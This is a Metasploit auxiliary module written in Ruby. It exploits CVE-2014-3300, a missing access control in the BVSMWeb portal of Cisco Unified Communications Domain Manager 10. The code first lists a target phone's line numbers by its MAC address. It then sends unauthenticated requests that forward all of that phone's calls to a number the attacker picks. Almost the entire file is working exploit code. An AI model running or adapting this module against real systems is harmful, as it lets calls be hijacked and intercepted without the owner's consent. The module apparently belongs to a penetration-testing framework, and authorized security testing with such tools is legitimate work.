##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',
      'Description' => %q{
        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager
        (CDM) 10 does not properly implement access control, which allows remote attackers to
        modify user information. This module exploits the vulnerability to configure unauthorized
        call forwarding.
      },
      'Author'      => 'fozavci',
      'References'  =>
        [
          ['CVE', '2014-3300'],
          ['BID', '68331']
        ],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Forward', { 'Description' => 'Enabling the call forwarding for the MAC address' } ],
          [ 'Info', { 'Description' => 'Retrieving the call forwarding information for the MAC address' } ]
        ],
      'DefaultAction'  => 'Info'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
        OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
        OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
        OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines'])
      ])
  end

  def run
    case action.name.upcase
    when 'INFO'
      get_info
    when 'FORWARD'
      forward_calls
    end
  end

  def get_info
    uri = normalize_uri(target_uri.to_s)
    mac = datastore["MAC"]

    print_status("Getting fintnumbers and display names of the IP phone")

    res = send_request_cgi(
        {
            'uri'    => normalize_uri(uri, 'showcallfwd.cgi'),
            'method' => 'GET',
            'vars_get' => {
                'device' => "SEP#{mac}"
            }
        })

    unless res && res.code == 200 && res.body && res.body.to_s =~ /fintnumber/
      print_error("Target appears not vulnerable!")
      print_status("#{res}")
      return []
    end

    doc = REXML::Document.new(res.body)
    lines = []
    fint_numbers = []

    list = doc.root.get_elements('MenuItem')

    list.each do |lst|
      xlist = lst.get_elements('Name')
      xlist.each {|l| lines << "#{l[0]}"}
      xlist = lst.get_elements('URL')
      xlist.each {|l| fint_numbers << "#{l[0].to_s.split('fintnumber=')[1]}" }
    end

    lines.size.times do |i|
      print_status("Display Name: #{lines[i]}, Fintnumber: #{fint_numbers[i]}")
    end

    fint_numbers
  end

  def forward_calls
    # for a specific FINTNUMBER redirection
    uri = normalize_uri(target_uri.to_s)
    forward_to = datastore["FORWARDTO"]
    mac = datastore["MAC"]

    if datastore['FINTNUMBER']
      fint_numbers = [datastore['FINTNUMBER']]
    else
      fint_numbers = get_info
    end

    if fint_numbers.empty?
      print_error("FINTNUMBER required to forward calls")
      return
    end

    fint_numbers.each do |fintnumber|

      print_status("Sending call forward request for #{fintnumber}")

      send_request_cgi(
          {
              'uri'    => normalize_uri(uri, 'phonecallfwd.cgi'),
              'method' => 'GET',
              'vars_get' => {
                  'cfoption'     => 'CallForwardAll',
                  'device'       => "SEP#{mac}",
                  'ProviderName' => 'NULL',
                  'fintnumber'   => "#{fintnumber}",
                  'telno1'       => "#{forward_to}"
              }
          })

      res = send_request_cgi(
          {
              'uri'    => normalize_uri(uri, 'showcallfwdperline.cgi'),
              'method' => 'GET',
              'vars_get' => {
                  'device'     => "SEP#{mac}",
                  'fintnumber' => "#{fintnumber}"
              }
          })

      if res && res.body && res.body && res.body.to_s =~ /CFA/
        print_good("Call forwarded successfully for #{fintnumber}")
      else
        print_error("Call forward failed")
      end
    end
  end
end
